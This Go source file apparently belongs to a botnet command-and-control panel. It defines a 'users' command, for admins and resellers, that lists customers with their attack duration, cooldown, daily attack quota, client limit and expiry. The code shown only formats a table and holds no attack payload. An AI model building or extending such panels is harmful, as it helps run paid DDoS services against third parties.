package commands

import (
	"cnc/internal/database"
	"cnc/internal/master/command"
	"cnc/internal/master/sessions"
	"cnc/pkg/pattern"
	"fmt"
	"github.com/alexeyco/simpletable"
	"github.com/dustin/go-humanize"
	"sort"
)

func init() {
	command.Create(&command.Command{
		Aliases:     []string{"users"},
		Roles:       []string{"admin", "reseller"},
		Description: "Easily manage user profiles.",
		SubCommands: []*command.Command{
			command.SubCommandListCommand,
			commandUsersAdd,
			commandUsersAddRole,
			commandUsersDelRole,
			commandUsersAddExpiry,
			commandUsersRemove,
			commandUsersEdit,
			commandUsersReset,
		},
		Executor: func(session *sessions.Session, ctx *command.Context) error {
			// retrieve all users from the database
			users, err := database.User.SelectAll()
			if err != nil {
				return err
			}

			// sort by id
			sort.Slice(users, func(i, j int) bool {
				return users[i].ID < users[j].ID
			})

			// create table & set headers
			table := simpletable.New()
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "ID"},
					{Align: simpletable.AlignCenter, Text: "Username"},
					{Align: simpletable.AlignCenter, Text: "Duration"},
					{Align: simpletable.AlignCenter, Text: "Cooldown"},
					{Align: simpletable.AlignCenter, Text: "Daily attacks"},
					{Align: simpletable.AlignCenter, Text: "Max. clients"},
					{Align: simpletable.AlignCenter, Text: "Expiry"},
					{Align: simpletable.AlignCenter, Text: "Roles"},
					{Align: simpletable.AlignCenter, Text: "Parent"},
				},
			}
			// go through all users and add it to the cell
			for _, user := range users {
				cell := []*simpletable.Cell{
					{Text: fmt.Sprintf("%d", user.ID)},
					{Text: user.Name},
					{Text: fmt.Sprintf("%d/%d", user.Duration, user.ApiDuration)},
					{Text: fmt.Sprintf("%d/%d", user.Cooldown, user.ApiCooldown)},
					{Text: fmt.Sprintf("%d/%d", user.LeftAttacks(), user.DailyAttacks)},
					{Text: pattern.FormatCount(user.Clients, "Infinite")},
					{Text: humanize.Time(user.Expiry)},
					{Text: pattern.FormatArray(user.Roles)},
					{Text: user.CreatedBy},
				}

				table.Body.Cells = append(table.Body.Cells, cell)
			}

			// render table
			table.SetStyle(simpletable.StyleCompact)
			return session.Table(table, 1)
		},
	})
}
